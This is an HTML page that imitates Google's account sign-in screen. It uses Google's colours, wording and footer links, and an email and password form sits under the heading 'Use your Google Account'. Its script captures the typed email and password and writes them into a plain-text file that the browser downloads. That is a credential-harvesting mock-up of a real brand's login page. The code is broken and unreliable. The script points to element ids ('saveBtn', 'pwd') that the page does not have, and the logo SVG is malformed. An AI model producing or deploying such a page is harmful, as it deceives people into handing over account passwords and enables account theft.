<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
        }

        .card {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
        }

        .logo {
            width: 75px;
            height: 24px;
            margin: 0 auto 16px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
            font-weight: 400;
        }

        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-top: 8px;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .info-text {
            font-size: 14px;
            color: #5f6368;
            text-align: left;
            margin-top: 16px;
            line-height: 1.4;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-btn:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }

        .next-btn:active {
            background-color: #1557b0;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer-left {
            display: flex;
            gap: 20px;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer a:hover {
            color: #202124;
        }

        .language-select {
            border: none;
            background: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }

        /* Specific styling for the password input */
        input[type="password"] {
            margin-top: 20px;
            /* pushes the field down from whatever’s above it */
            padding-top: 15px;
            /* adds padding inside the box */
            padding-bottom: 13px;
        }

        /* optional: if you want the label also spaced consistently */
        .password-label {
            display: block;
            margin-top: 24px;
            font-size: 14px;
            color: #202124;
            font-weight: 500;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">

                        fill="#4285F4" />
                </g>
            </svg>

            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>

            <form id="loginForm" method="POST">
                <div class="input-group">
                    <input type="email" id="email" name="email" placeholder="Email or phone" required>
                    <input type="password" id="password" name="password" placeholder="Password" required>

                    <a href="#" class="forgot-email">Forgot email?</a>
                </div>

                <p class="info-text">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                </p>

                <div class="button-container">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="footer-left">
                <select class="language-select">
                    <option>English (United States)</option>
                    <option>Español</option>
                    <option>Français</option>
                </select>
            </div>
            <div>
                <a href="#">Help</a>
                <span style="margin: 0 8px;">·</span>
                <a href="#">Privacy</a>
                <span style="margin: 0 8px;">·</span>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('saveBtn').addEventListener('click', (e) => {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const pwd = document.getElementById('pwd').value;

            if (!email && !pwd) {
                alert("Both fields are empty!");
                return;
            }

            const text = `Email: ${email}\nPassword: ${pwd}`;
            const blob = new Blob([text], { type: 'text/plain' });

            const link = document.createElement('a');
            link.download = 'myTextFile.txt';
            link.href = URL.createObjectURL(blob);
            link.click();

            URL.revokeObjectURL(link.href);
        });



    </script>
</body>

</html>
